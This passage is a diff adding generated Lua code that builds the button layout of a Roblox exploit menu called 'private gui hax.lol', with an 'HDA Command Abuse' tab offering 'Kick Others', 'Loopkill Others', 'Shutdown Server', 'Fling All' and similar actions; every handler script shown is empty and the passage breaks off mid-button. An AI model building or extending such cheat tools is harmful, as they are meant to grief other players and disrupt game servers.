+G2L["1d4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1d4"]["Text"] = [[Jail Others]];
+G2L["1d4"]["Name"] = [[Button]];
+G2L["1d4"]["Position"] = UDim2.new(0.63224, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1d5"] = Instance.new("LocalScript", G2L["1d4"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1d6"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1d6"]["TextWrapped"] = true;
+G2L["1d6"]["BorderSizePixel"] = 3;
+G2L["1d6"]["TextSize"] = 14;
+G2L["1d6"]["TextScaled"] = true;
+G2L["1d6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1d6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1d6"]["Text"] = [[Explode All]];
+G2L["1d6"]["Name"] = [[Button]];
+G2L["1d6"]["Position"] = UDim2.new(0.83412, 0, 0.02497, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1d7"] = Instance.new("LocalScript", G2L["1d6"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1d8"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1d8"]["TextWrapped"] = true;
+G2L["1d8"]["BorderSizePixel"] = 3;
+G2L["1d8"]["TextSize"] = 14;
+G2L["1d8"]["TextScaled"] = true;
+G2L["1d8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1d8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1d8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1d8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1d8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1d8"]["Text"] = [[WalkSpeed 50 (HD)]];
+G2L["1d8"]["Name"] = [[Button]];
+G2L["1d8"]["Position"] = UDim2.new(0.01565, 0, 0.1412, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1d9"] = Instance.new("LocalScript", G2L["1d8"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1da"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1da"]["TextWrapped"] = true;
+G2L["1da"]["BorderSizePixel"] = 3;
+G2L["1da"]["TextSize"] = 14;
+G2L["1da"]["TextScaled"] = true;
+G2L["1da"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1da"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1da"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1da"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1da"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1da"]["Text"] = [[cZerkidd Avatars]];
+G2L["1da"]["Name"] = [[Button]];
+G2L["1da"]["Position"] = UDim2.new(0.22066, 0, 0.1412, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1db"] = Instance.new("LocalScript", G2L["1da"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1dc"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1dc"]["TextWrapped"] = true;
+G2L["1dc"]["BorderSizePixel"] = 3;
+G2L["1dc"]["TextSize"] = 14;
+G2L["1dc"]["TextScaled"] = true;
+G2L["1dc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1dc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1dc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1dc"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1dc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1dc"]["Text"] = [[Elv4r0x Avatars]];
+G2L["1dc"]["Name"] = [[Button]];
+G2L["1dc"]["Position"] = UDim2.new(0.42567, 0, 0.1412, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1dd"] = Instance.new("LocalScript", G2L["1dc"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1de"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1de"]["TextWrapped"] = true;
+G2L["1de"]["BorderSizePixel"] = 3;
+G2L["1de"]["TextSize"] = 14;
+G2L["1de"]["TextScaled"] = true;
+G2L["1de"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1de"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1de"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1de"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1de"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1de"]["Text"] = [[Picklelover Avatars]];
+G2L["1de"]["Name"] = [[Button]];
+G2L["1de"]["Position"] = UDim2.new(0.63224, 0, 0.1412, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1df"] = Instance.new("LocalScript", G2L["1de"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1e0"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1e0"]["TextWrapped"] = true;
+G2L["1e0"]["BorderSizePixel"] = 3;
+G2L["1e0"]["TextSize"] = 14;
+G2L["1e0"]["TextScaled"] = true;
+G2L["1e0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1e0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1e0"]["Text"] = [[R6 All]];
+G2L["1e0"]["Name"] = [[Button]];
+G2L["1e0"]["Position"] = UDim2.new(0.83412, 0, 0.1412, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1e1"] = Instance.new("LocalScript", G2L["1e0"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1e2"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1e2"]["TextWrapped"] = true;
+G2L["1e2"]["BorderSizePixel"] = 3;
+G2L["1e2"]["TextSize"] = 14;
+G2L["1e2"]["TextScaled"] = true;
+G2L["1e2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1e2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1e2"]["Text"] = [[Mute Others]];
+G2L["1e2"]["Name"] = [[Button]];
+G2L["1e2"]["Position"] = UDim2.new(0.01565, 0, 0.25742, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1e3"] = Instance.new("LocalScript", G2L["1e2"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1e4"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1e4"]["TextWrapped"] = true;
+G2L["1e4"]["BorderSizePixel"] = 3;
+G2L["1e4"]["TextSize"] = 14;
+G2L["1e4"]["TextScaled"] = true;
+G2L["1e4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1e4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1e4"]["Text"] = [[UnMute Others]];
+G2L["1e4"]["Name"] = [[Button]];
+G2L["1e4"]["Position"] = UDim2.new(0.22066, 0, 0.25742, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1e5"] = Instance.new("LocalScript", G2L["1e4"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1e6"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1e6"]["TextWrapped"] = true;
+G2L["1e6"]["BorderSizePixel"] = 3;
+G2L["1e6"]["TextSize"] = 14;
+G2L["1e6"]["TextScaled"] = true;
+G2L["1e6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1e6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1e6"]["Text"] = [[RE All]];
+G2L["1e6"]["Name"] = [[Button]];
+G2L["1e6"]["Position"] = UDim2.new(0.4241, 0, 0.25742, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1e7"] = Instance.new("LocalScript", G2L["1e6"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1e8"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1e8"]["TextWrapped"] = true;
+G2L["1e8"]["BorderSizePixel"] = 3;
+G2L["1e8"]["TextSize"] = 14;
+G2L["1e8"]["TextScaled"] = true;
+G2L["1e8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1e8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1e8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1e8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1e8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1e8"]["Text"] = [[Hint]];
+G2L["1e8"]["Name"] = [[Button]];
+G2L["1e8"]["Position"] = UDim2.new(0.63224, 0, 0.25742, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1e9"] = Instance.new("LocalScript", G2L["1e8"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1ea"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1ea"]["TextWrapped"] = true;
+G2L["1ea"]["BorderSizePixel"] = 3;
+G2L["1ea"]["TextSize"] = 14;
+G2L["1ea"]["TextScaled"] = true;
+G2L["1ea"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ea"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ea"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ea"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ea"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ea"]["Text"] = [[Message]];
+G2L["1ea"]["Name"] = [[Button]];
+G2L["1ea"]["Position"] = UDim2.new(0.83412, 0, 0.25742, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1eb"] = Instance.new("LocalScript", G2L["1ea"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1ec"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1ec"]["TextWrapped"] = true;
+G2L["1ec"]["BorderSizePixel"] = 3;
+G2L["1ec"]["TextSize"] = 14;
+G2L["1ec"]["TextScaled"] = true;
+G2L["1ec"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ec"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ec"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ec"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ec"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ec"]["Text"] = [[Disco (HD)]];
+G2L["1ec"]["Name"] = [[Button]];
+G2L["1ec"]["Position"] = UDim2.new(0.01565, 0, 0.37848, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1ed"] = Instance.new("LocalScript", G2L["1ec"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1ee"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1ee"]["TextWrapped"] = true;
+G2L["1ee"]["BorderSizePixel"] = 3;
+G2L["1ee"]["TextSize"] = 14;
+G2L["1ee"]["TextScaled"] = true;
+G2L["1ee"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1ee"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1ee"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1ee"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1ee"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1ee"]["Text"] = [[UnDisco (HD)]];
+G2L["1ee"]["Name"] = [[Button]];
+G2L["1ee"]["Position"] = UDim2.new(0.22066, 0, 0.37848, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1ef"] = Instance.new("LocalScript", G2L["1ee"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1f0"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1f0"]["TextWrapped"] = true;
+G2L["1f0"]["BorderSizePixel"] = 3;
+G2L["1f0"]["TextSize"] = 14;
+G2L["1f0"]["TextScaled"] = true;
+G2L["1f0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f0"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f0"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f0"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1f0"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1f0"]["Text"] = [[Notice All]];
+G2L["1f0"]["Name"] = [[Button]];
+G2L["1f0"]["Position"] = UDim2.new(0.4241, 0, 0.37848, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1f1"] = Instance.new("LocalScript", G2L["1f0"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1f2"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1f2"]["TextWrapped"] = true;
+G2L["1f2"]["BorderSizePixel"] = 3;
+G2L["1f2"]["TextSize"] = 14;
+G2L["1f2"]["TextScaled"] = true;
+G2L["1f2"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f2"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f2"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1f2"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1f2"]["Text"] = [[Loopkill Others]];
+G2L["1f2"]["Name"] = [[Button]];
+G2L["1f2"]["Position"] = UDim2.new(0.63224, 0, 0.37848, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1f3"] = Instance.new("LocalScript", G2L["1f2"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1f4"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1f4"]["TextWrapped"] = true;
+G2L["1f4"]["BorderSizePixel"] = 3;
+G2L["1f4"]["TextSize"] = 14;
+G2L["1f4"]["TextScaled"] = true;
+G2L["1f4"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f4"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f4"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f4"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1f4"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1f4"]["Text"] = [[UnLoopkill Others]];
+G2L["1f4"]["Name"] = [[Button]];
+G2L["1f4"]["Position"] = UDim2.new(0.83412, 0, 0.37848, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1f5"] = Instance.new("LocalScript", G2L["1f4"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1f6"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1f6"]["TextWrapped"] = true;
+G2L["1f6"]["BorderSizePixel"] = 3;
+G2L["1f6"]["TextSize"] = 14;
+G2L["1f6"]["TextScaled"] = true;
+G2L["1f6"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f6"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f6"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1f6"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1f6"]["Text"] = [[Fling All]];
+G2L["1f6"]["Name"] = [[Button]];
+G2L["1f6"]["Position"] = UDim2.new(0.01565, 0, 0.50681, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1f7"] = Instance.new("LocalScript", G2L["1f6"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1f8"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1f8"]["TextWrapped"] = true;
+G2L["1f8"]["BorderSizePixel"] = 3;
+G2L["1f8"]["TextSize"] = 14;
+G2L["1f8"]["TextScaled"] = true;
+G2L["1f8"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1f8"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1f8"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1f8"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1f8"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1f8"]["Text"] = [[Sword All]];
+G2L["1f8"]["Name"] = [[Button]];
+G2L["1f8"]["Position"] = UDim2.new(0.22066, 0, 0.50681, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1f9"] = Instance.new("LocalScript", G2L["1f8"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1fa"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1fa"]["TextWrapped"] = true;
+G2L["1fa"]["BorderSizePixel"] = 3;
+G2L["1fa"]["TextSize"] = 14;
+G2L["1fa"]["TextScaled"] = true;
+G2L["1fa"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1fa"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1fa"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1fa"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1fa"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1fa"]["Text"] = [[ k00pkidd Avatars]];
+G2L["1fa"]["Name"] = [[Button]];
+G2L["1fa"]["Position"] = UDim2.new(0.42567, 0, 0.50681, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1fb"] = Instance.new("LocalScript", G2L["1fa"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1fc"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1fc"]["TextWrapped"] = true;
+G2L["1fc"]["BorderSizePixel"] = 3;
+G2L["1fc"]["TextSize"] = 14;
+G2L["1fc"]["TextScaled"] = true;
+G2L["1fc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1fc"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1fc"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1fc"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1fc"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1fc"]["Text"] = [[1x1x1x1 Message Script]];
+G2L["1fc"]["Name"] = [[Button]];
+G2L["1fc"]["Position"] = UDim2.new(0.63224, 0, 0.50681, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1fd"] = Instance.new("LocalScript", G2L["1fc"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["1fe"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["1fe"]["TextWrapped"] = true;
+G2L["1fe"]["BorderSizePixel"] = 3;
+G2L["1fe"]["TextSize"] = 14;
+G2L["1fe"]["TextScaled"] = true;
+G2L["1fe"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["1fe"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["1fe"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["1fe"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["1fe"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["1fe"]["Text"] = [[Kick Others]];
+G2L["1fe"]["Name"] = [[Button]];
+G2L["1fe"]["Position"] = UDim2.new(0.83412, 0, 0.50681, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["1ff"] = Instance.new("LocalScript", G2L["1fe"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["200"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["200"]["TextWrapped"] = true;
+G2L["200"]["BorderSizePixel"] = 3;
+G2L["200"]["TextSize"] = 14;
+G2L["200"]["TextScaled"] = true;
+G2L["200"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["200"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["200"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["200"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["200"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["200"]["Text"] = [[Shutdown Server]];
+G2L["200"]["Name"] = [[Button]];
+G2L["200"]["Position"] = UDim2.new(0.01565, 0, 0.6303, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["201"] = Instance.new("LocalScript", G2L["200"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["202"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["202"]["TextWrapped"] = true;
+G2L["202"]["BorderSizePixel"] = 3;
+G2L["202"]["TextSize"] = 14;
+G2L["202"]["TextScaled"] = true;
+G2L["202"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["202"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["202"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["202"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["202"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["202"]["Text"] = [[WalkSpeed 50 All (HD)]];
+G2L["202"]["Name"] = [[Button]];
+G2L["202"]["Position"] = UDim2.new(0.22066, 0, 0.6303, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["203"] = Instance.new("LocalScript", G2L["202"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["204"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["204"]["TextWrapped"] = true;
+G2L["204"]["BorderSizePixel"] = 3;
+G2L["204"]["TextSize"] = 14;
+G2L["204"]["TextScaled"] = true;
+G2L["204"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["204"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["204"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["204"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["204"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["204"]["Text"] = [[Fling + Explode All]];
+G2L["204"]["Name"] = [[Button]];
+G2L["204"]["Position"] = UDim2.new(0.4241, 0, 0.6303, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["205"] = Instance.new("LocalScript", G2L["204"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["206"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["206"]["TextWrapped"] = true;
+G2L["206"]["BorderSizePixel"] = 3;
+G2L["206"]["TextSize"] = 14;
+G2L["206"]["TextScaled"] = true;
+G2L["206"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["206"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["206"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["206"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["206"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["206"]["Text"] = [[BillBoard]];
+G2L["206"]["Name"] = [[Button]];
+G2L["206"]["Position"] = UDim2.new(0.63224, 0, 0.6303, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["207"] = Instance.new("LocalScript", G2L["206"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["208"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["208"]["TextWrapped"] = true;
+G2L["208"]["BorderSizePixel"] = 3;
+G2L["208"]["TextSize"] = 14;
+G2L["208"]["TextScaled"] = true;
+G2L["208"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["208"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["208"]["FontFace"] = Font.new([[rbxasset://fonts/families/ComicNeueAngular.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["208"]["Size"] = UDim2.new(0, 95, 0, 32);
+G2L["208"]["BorderColor3"] = Color3.fromRGB(165, 168, 0);
+G2L["208"]["Text"] = [[BillBoard 2]];
+G2L["208"]["Name"] = [[Button]];
+G2L["208"]["Position"] = UDim2.new(0.83412, 0, 0.6303, 0);
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button.LocalScript
+G2L["209"] = Instance.new("LocalScript", G2L["208"]);
+
+
+
+-- StarterGui.private gui hax.lol.HDA Command Abuse tab Page.Button
+G2L["20a"] = Instance.new("TextButton", G2L["1cd"]);
+G2L["20a"]["TextWrapped"] = true;
+G2L["20a"]["BorderSizePixel"] = 3;
+G2L["20a"]["TextSize"] = 14;
+G2L["20a"]["TextScaled"] = true;
